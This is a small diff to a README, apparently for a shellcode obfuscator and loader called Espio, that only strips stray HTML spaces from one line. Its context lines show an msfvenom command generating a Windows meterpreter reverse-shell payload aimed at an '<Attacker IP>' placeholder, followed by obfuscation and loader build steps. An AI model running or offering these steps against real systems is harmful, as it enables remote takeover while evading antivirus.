@@ -26,7 +26,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=1337 -
 ```bash
 python3 obfuscator.py shellcode
 ```
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Note: Our shellcode then be obfuscated to **obfuscatedPayload.bin** with the **key.bin** key and saved in loader/Espio.
+Note: Our shellcode then be obfuscated to **obfuscatedPayload.bin** with the **key.bin** key and saved in loader/Espio.
 
 4. Open loader/Espio.sln, the Visual Studio solution file.
 
